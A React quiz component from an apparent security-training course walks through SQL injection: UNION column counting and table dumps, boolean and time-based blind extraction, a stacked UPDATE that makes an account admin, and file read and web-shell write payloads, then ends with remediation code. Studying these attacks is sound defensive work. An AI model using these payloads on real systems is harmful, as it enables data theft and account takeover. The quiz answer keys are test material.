import { useState } from "react";
import "./styles.scss";

export default function ExploitationTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "data-extraction",
      title: "Data Extraction",
      description: "Extract sensitive information from the database",
      task: (
        <div className="task-box">
          <h4>Extracting Data Using UNION</h4>
          <p className="task-intro">
            Once vulnerability is confirmed, use UNION SELECT to extract data
          </p>

          <div className="exploitation-demo">
            <div className="exploit-step">
              <h5>Step 1: Determine number of columns</h5>
              <div className="code-block">
                <code>' ORDER BY 1--</code>
                <span className="result success">✓ Success</span>
              </div>
              <div className="code-block">
                <code>' ORDER BY 2--</code>
                <span className="result success">✓ Success</span>
              </div>
              <div className="code-block">
                <code>' ORDER BY 3--</code>
                <span className="result success">✓ Success</span>
              </div>
              <div className="code-block">
                <code>' ORDER BY 4--</code>
                <span className="result error">✗ Error</span>
              </div>
              <p className="conclusion">Result: Query has 3 columns</p>
            </div>

            <div className="exploit-step">
              <h5>Step 2: Find displayable columns</h5>
              <div className="code-block">
                <code>' UNION SELECT NULL, NULL, NULL--</code>
                <span className="result success">✓ Success</span>
              </div>
              <div className="code-block">
                <code>' UNION SELECT 1, 2, 3--</code>
                <span className="result success">✓ Displays: 2, 3</span>
              </div>
              <p className="conclusion">
                Columns 2 and 3 are visible in output
              </p>
            </div>

            <div className="exploit-step">
              <h5>Step 3: Extract database information</h5>
              <div className="code-block">
                <code>' UNION SELECT NULL, @@version, database()--</code>
              </div>
              <div className="output-box">
                <strong>Output:</strong>
                <p>MySQL 8.0.32</p>
                <p>Database: user_accounts</p>
              </div>
            </div>

            <div className="exploit-step">
              <h5>Step 4: Extract table names</h5>
              <div className="code-block">
                <code>
                  ' UNION SELECT NULL, table_name, NULL FROM
                  information_schema.tables WHERE table_schema='user_accounts'--
                </code>
              </div>
              <div className="output-box">
                <strong>Tables found:</strong>
                <ul>
                  <li>users</li>
                  <li>passwords</li>
                  <li>sessions</li>
                  <li>admin_users</li>
                </ul>
              </div>
            </div>

            <div className="exploit-step">
              <h5>Step 5: Extract column names</h5>
              <div className="code-block">
                <code>
                  ' UNION SELECT NULL, column_name, NULL FROM
                  information_schema.columns WHERE table_name='users'--
                </code>
              </div>
              <div className="output-box">
                <strong>Columns in 'users' table:</strong>
                <ul>
                  <li>id</li>
                  <li>username</li>
                  <li>email</li>
                  <li>password_hash</li>
                  <li>role</li>
                </ul>
              </div>
            </div>

            <div className="exploit-step">
              <h5>Step 6: Extract user data</h5>
              <div className="code-block">
                <code>
                  ' UNION SELECT NULL, username, password_hash FROM users--
                </code>
              </div>
              <div className="output-box critical">
                <strong>CRITICAL DATA EXTRACTED:</strong>
                <table className="data-table">
                  <thead>
                    <tr>
                      <th>Username</th>
                      <th>Password Hash</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>admin</td>
                      <td>5f4dcc3b5aa765d61d8327deb882cf99</td>
                    </tr>
                    <tr>
                      <td>john_doe</td>
                      <td>e99a18c428cb38d5f260853678922e03</td>
                    </tr>
                    <tr>
                      <td>jane_smith</td>
                      <td>098f6bcd4621d373cade4e832627b4f6</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          <div className="warning-box">
            <p>
              <strong>Ethical Warning:</strong> In real penetration testing,
              immediately report findings to the client. Never extract or misuse
              actual user data.
            </p>
          </div>
        </div>
      ),
      question: "What is the correct order for UNION-based data extraction?",
      options: [
        "Extract data → Find columns → Count columns → Get table names",
        "Count columns → Find displayable columns → Get table names → Extract data",
        "Get table names → Count columns → Extract data → Find columns",
        "Find columns → Extract data → Count columns → Get table names",
      ],
      correct: 1,
      explanation:
        "The correct order is: 1) Count columns with ORDER BY, 2) Find which columns display output, 3) Get database/table/column names from information_schema, 4) Extract the actual data.",
    },
    {
      id: "blind-exploitation",
      title: "Blind SQL Injection",
      description: "Extract data without seeing direct output",
      task: (
        <div className="task-box">
          <h4>Boolean-Based Blind SQL Injection</h4>
          <p className="task-intro">
            When no output is displayed, use conditional logic to extract data
            one bit at a time
          </p>

          <div className="blind-demo">
            <div className="blind-technique">
              <h5>Technique: Boolean-Based Extraction</h5>
              <p className="technique-desc">
                Application responds differently for TRUE vs FALSE conditions
              </p>

              <div className="blind-example">
                <strong>Extracting database name length:</strong>
                <div className="code-block">
                  <code>' AND LENGTH(database()) = 1--</code>
                  <span className="result error">No results (FALSE)</span>
                </div>
                <div className="code-block">
                  <code>' AND LENGTH(database()) = 10--</code>
                  <span className="result success">Shows data (TRUE)</span>
                </div>
                <p className="conclusion">
                  Database name is 10 characters long
                </p>
              </div>

              <div className="blind-example">
                <strong>Extracting first character:</strong>
                <div className="code-block">
                  <code>' AND SUBSTRING(database(),1,1) = 'a'--</code>
                  <span className="result error">No results (FALSE)</span>
                </div>
                <div className="code-block">
                  <code>' AND SUBSTRING(database(),1,1) = 'u'--</code>
                  <span className="result success">Shows data (TRUE)</span>
                </div>
                <p className="conclusion">First character is 'u'</p>
              </div>

              <div className="progress-viz">
                <h6>Extracting: "user_accounts"</h6>
                <div className="char-progress">
                  <span className="char extracted">u</span>
                  <span className="char extracted">s</span>
                  <span className="char extracted">e</span>
                  <span className="char extracted">r</span>
                  <span className="char extracted">_</span>
                  <span className="char extracting">a</span>
                  <span className="char pending">?</span>
                  <span className="char pending">?</span>
                  <span className="char pending">?</span>
                  <span className="char pending">?</span>
                </div>
                <p className="progress-text">
                  Progress: 6/10 characters | ~260 requests sent
                </p>
              </div>
            </div>

            <div className="blind-technique">
              <h5>Technique: Time-Based Blind Injection</h5>
              <p className="technique-desc">
                When no visible difference exists, use time delays
              </p>

              <div className="blind-example">
                <strong>Testing with time delay:</strong>
                <div className="code-block">
                  <code>' AND IF(1=1, SLEEP(5), 0)--</code>
                  <span className="result delay">
                    Response: 5 seconds (TRUE)
                  </span>
                </div>
                <div className="code-block">
                  <code>' AND IF(1=2, SLEEP(5), 0)--</code>
                  <span className="result instant">
                    Response: instant (FALSE)
                  </span>
                </div>
              </div>

              <div className="blind-example">
                <strong>Extracting admin password first char:</strong>
                <div className="code-block">
                  <code>
                    ' AND IF(SUBSTRING((SELECT password FROM users WHERE
                    username='admin'),1,1)='a', SLEEP(5), 0)--
                  </code>
                  <span className="result instant">Instant → Not 'a'</span>
                </div>
                <div className="code-block">
                  <code>
                    ' AND IF(SUBSTRING((SELECT password FROM users WHERE
                    username='admin'),1,1)='p', SLEEP(5), 0)--
                  </code>
                  <span className="result delay">5 sec delay → Is 'p'!</span>
                </div>
              </div>
            </div>
          </div>

          <div className="info-box">
            <h5>Why use Blind SQL Injection?</h5>
            <ul>
              <li>Application doesn't display database errors</li>
              <li>No direct output of query results</li>
              <li>Still possible to extract data, just slower</li>
              <li>Can automate with tools like SQLmap</li>
            </ul>
          </div>
        </div>
      ),
      question: "What makes Blind SQL Injection 'blind'?",
      options: [
        "The attacker can't see the database",
        "No direct output of query results is displayed",
        "The database is encrypted",
        "It only works at night",
      ],
      correct: 1,
      explanation:
        "Blind SQL Injection is 'blind' because the application doesn't display database query results or errors directly. Attackers must infer data through application behavior (TRUE/FALSE responses or time delays).",
    },
    {
      id: "privilege-escalation",
      title: "Privilege Escalation",
      description: "Gain administrative access and control",
      task: (
        <div className="task-box">
          <h4>Escalating Privileges</h4>
          <p className="task-intro">
            Leverage SQL injection to gain higher-level access
          </p>

          <div className="escalation-demo">
            <div className="escalation-step">
              <div className="step-badge">Step 1</div>
              <div className="step-content">
                <h5>Identify Current Privileges</h5>
                <div className="code-block">
                  <code>' UNION SELECT NULL, current_user(), user()--</code>
                </div>
                <div className="output-box">
                  <strong>Result:</strong>
                  <p>Current user: web_user@localhost</p>
                  <p>Privileges: SELECT, INSERT, UPDATE</p>
                </div>
              </div>
            </div>

            <div className="escalation-step">
              <div className="step-badge">Step 2</div>
              <div className="step-content">
                <h5>Find Admin Accounts</h5>
                <div className="code-block">
                  <code>
                    ' UNION SELECT NULL, username, role FROM users WHERE
                    role='admin'--
                  </code>
                </div>
                <div className="output-box">
                  <strong>Admin accounts found:</strong>
                  <ul>
                    <li>admin (role: admin)</li>
                    <li>superuser (role: admin)</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="escalation-step">
              <div className="step-badge">Step 3</div>
              <div className="step-content">
                <h5>Modify User Role (if UPDATE privilege exists)</h5>
                <div className="code-block">
                  <code>
                    '; UPDATE users SET role='admin' WHERE username='attacker'--
                  </code>
                </div>
                <div className="output-box success">
                  <strong>Privilege escalated!</strong>
                  <p>User 'attacker' now has admin role</p>
                </div>
              </div>
            </div>

            <div className="escalation-step">
              <div className="step-badge">Step 4</div>
              <div className="step-content">
                <h5>Access Admin Panel</h5>
                <p className="step-desc">
                  Log in with escalated account to access restricted areas
                </p>
                <div className="admin-panel">
                  <div className="panel-header">
                    <span>Admin Dashboard</span>
                    <span className="user-badge">
                      Logged in as: attacker (Admin)
                    </span>
                  </div>
                  <div className="panel-options">
                    <div className="option">View all users</div>
                    <div className="option">Modify user permissions</div>
                    <div className="option">Access system logs</div>
                    <div className="option">Database backup/restore</div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="danger-box">
            <p>
              <strong>
                Advanced Attacks (Requires elevated DB privileges):
              </strong>
            </p>
            <ul>
              <li>
                File system access: <code>LOAD_FILE('/etc/passwd')</code>
              </li>
              <li>
                Write files: <code>INTO OUTFILE '/var/www/shell.php'</code>
              </li>
              <li>Execute OS commands (if xp_cmdshell enabled on MSSQL)</li>
              <li>Create new admin accounts</li>
            </ul>
          </div>
        </div>
      ),
      question: "What is the goal of privilege escalation in SQL injection?",
      options: [
        "To make the database run faster",
        "To gain higher-level access (e.g., admin) than initially available",
        "To delete all user accounts",
        "To encrypt the database",
      ],
      correct: 1,
      explanation:
        "Privilege escalation aims to gain higher-level access (like admin privileges) than the attacker initially has, allowing access to restricted features, data, or system functions.",
    },
    {
      id: "remediation",
      title: "Remediation & Prevention",
      description: "Learn how to fix and prevent SQL injection",
      task: (
        <div className="task-box">
          <h4>Preventing SQL Injection</h4>
          <p className="task-intro">
            Understanding how to defend against SQL injection is crucial
          </p>

          <div className="remediation-demo">
            <div className="vulnerable-code">
              <h5>Vulnerable Code</h5>
              <div className="code-block vulnerable">
                <pre>{`// Direct string concatenation
const query = "SELECT * FROM users WHERE username = '" 
  + username + "' AND password = '" + password + "'";
  
db.query(query, (err, results) => {
  // Process results
});`}</pre>
              </div>
              <p className="code-issue">
                Issue: User input directly inserted into SQL query
              </p>
            </div>

            <div className="secure-code">
              <h5>Secure Code - Prepared Statements</h5>
              <div className="code-block secure">
                <pre>{`// Using parameterized queries
const query = "SELECT * FROM users WHERE username = ? AND password = ?";

db.query(query, [username, password], (err, results) => {
  // Process results
});`}</pre>
              </div>
              <p className="code-fix">
                Fix: Parameters are safely escaped and bound
              </p>
            </div>

            <div className="secure-code">
              <h5>Secure Code - ORM (Object-Relational Mapping)</h5>
              <div className="code-block secure">
                <pre>{`// Using an ORM like Sequelize
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});`}</pre>
              </div>
              <p className="code-fix">
                Fix: ORM handles parameterization automatically
              </p>
            </div>

            <div className="secure-code">
              <h5>Secure Code - Stored Procedures</h5>
              <div className="code-block secure">
                <pre>{`// Using stored procedures
DELIMITER //
CREATE PROCEDURE authenticate_user(
  IN p_username VARCHAR(50),
  IN p_password VARCHAR(255)
)
BEGIN
  SELECT * FROM users 
  WHERE username = p_username 
  AND password = p_password;
END //
DELIMITER ;

// Call from application
db.query('CALL authenticate_user(?, ?)', [username, password]);`}</pre>
              </div>
              <p className="code-fix">
                Fix: Logic separated, parameters safely handled
              </p>
            </div>
          </div>

          <div className="best-practices">
            <h5>Defense-in-Depth Strategies</h5>
            <div className="practices-grid">
              <div className="practice-card">
                <div className="practice-icon">1</div>
                <h6>Input Validation</h6>
                <p>Whitelist allowed characters, reject suspicious input</p>
              </div>
              <div className="practice-card">
                <div className="practice-icon">2</div>
                <h6>Least Privilege</h6>
                <p>Database users should have minimal required permissions</p>
              </div>
              <div className="practice-card">
                <div className="practice-icon">3</div>
                <h6>Error Handling</h6>
                <p>Don't expose database errors to end users</p>
              </div>
              <div className="practice-card">
                <div className="practice-icon">4</div>
                <h6>Web Application Firewall</h6>
                <p>Filter malicious SQL patterns at network level</p>
              </div>
              <div className="practice-card">
                <div className="practice-icon">5</div>
                <h6>Regular Updates</h6>
                <p>Keep database and frameworks patched</p>
              </div>
              <div className="practice-card">
                <div className="practice-icon">6</div>
                <h6>Security Testing</h6>
                <p>Regular penetration testing and code reviews</p>
              </div>
            </div>
          </div>

          <div className="success-box">
            <p>
              <strong>Exploitation Phase Complete!</strong>
            </p>
            <p>
              You now understand how SQL injection is exploited and how to
              prevent it. Always practice ethical hacking with proper
              authorization!
            </p>
          </div>
        </div>
      ),
      question: "What is the BEST defense against SQL injection?",
      options: [
        "Hiding error messages",
        "Using prepared statements/parameterized queries",
        "Making queries longer and more complex",
        "Encrypting the database",
      ],
      correct: 1,
      explanation:
        "Prepared statements (parameterized queries) are the most effective defense because they completely separate SQL code from data, making injection impossible regardless of the input content.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("exploitation");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="exploitation-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "X") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button onClick={handleRestart} className="restart-button">
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>



        {!answered && (
          <div className="hint-content-box">
            <strong>Hint:</strong>
            <p>
              Think about what would be most effective in preventing SQL
              injection at the code level.
            </p>
          </div>
        )}
      </div>

      <div className="navigation-buttons">
        <button
          onClick={goPrev}
          disabled={currentStep === 0}
          className="nav-button prev-button"
        >
          Previous
        </button>

        {completedSteps.includes(currentStep) &&
          currentStep < steps.length - 1 && (
            <button onClick={goNext} className="nav-button next-button">
              Next
            </button>
          )}

        {completedSteps.length === steps.length && (
          <button className="nav-button complete-button">
            Phase completed!
          </button>
        )}
      </div>
    </div>
  );
}
